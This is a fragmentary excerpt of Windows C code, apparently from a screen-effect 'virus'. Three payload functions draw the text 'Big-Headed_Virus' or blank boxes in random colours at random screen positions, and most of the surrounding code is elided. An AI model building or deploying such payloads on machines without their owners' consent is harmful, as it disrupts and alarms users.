...
void Payload9(int t, HDC hdcScreen) {
	...
	SetBkColor(hdcScreen, RGB(rand() % 256, rand() % 256, rand() % 256));
	SetTextColor(hdcScreen, RGB(rand() % 256, rand() % 256, rand() % 256));

	TextOutA(hdcScreen, rand() % szScreen.cx, rand() % szScreen.cy, "Big-Headed_Virus", 16);
...
void Payload8(int t, HDC hdcScreen) {
	...
	for (int i = 0; i < 5; i++) {
		TextOutA(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, "Big-Headed_Virus", 16);
	}
...
void Payload10(int t, HDC hdcScreen) {
	...
	for (int i = 0; i < 5; i++) {
		TextOutA(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, "     ", 5);
	}
